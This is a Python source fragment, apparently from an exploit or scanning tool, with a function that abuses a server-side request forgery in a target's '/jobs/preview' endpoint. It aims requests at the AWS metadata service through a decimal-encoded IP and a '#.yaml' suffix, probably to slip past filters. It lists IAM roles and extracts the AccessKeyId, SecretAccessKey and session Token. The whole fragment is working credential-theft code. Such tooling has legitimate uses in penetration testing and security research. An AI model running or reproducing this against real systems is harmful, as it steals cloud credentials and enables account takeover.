    metadata_ip: str = "2852039166",
    role_name: str | None = None,
) -> dict[str, str] | None:
    """Get AWS IAM credentials from the metadata service.

    If role_name is not provided, discovers available roles first.
    Returns a dict with AccessKeyId, SecretAccessKey, Token, Expiration.
    """
    if role_name is None:
        url = f"http://{metadata_ip}/latest/meta-data/iam/security-credentials/#.yaml"
        r = scanner._make_request(
            "POST",
            f"{scanner.base_url}/jobs/preview",
            data={"url": url},
        )
        content_match = re.search(r"<pre>(.*?)</pre>", r.text, re.DOTALL)
        if not content_match:
            return None
        content = content_match.group(1).replace("&lt;", "<").replace("&gt;", ">")
        content = content.replace("&amp;", "&").replace("&#34;", '"').replace("&#39;", "'")
        roles = [r.strip() for r in content.split("\n") if r.strip() and "Not Found" not in r]
        if not roles:
            return None
        role_name = roles[0]

    url = f"http://{metadata_ip}/latest/meta-data/iam/security-credentials/{role_name}#.yaml"
    r = scanner._make_request(
        "POST",
        f"{scanner.base_url}/jobs/preview",
        data={"url": url},
    )
    content_match = re.search(r"<pre>(.*?)</pre>", r.text, re.DOTALL)
    if not content_match:
        return None
    content = content_match.group(1).replace("&lt;", "<").replace("&gt;", ">")
    content = content.replace("&amp;", "&").replace("&#34;", '"').replace("&#39;", "'")

    try:
        creds: dict[str, str] = json.loads(content)
        return creds
    except (json.JSONDecodeError, ValueError):
        return None
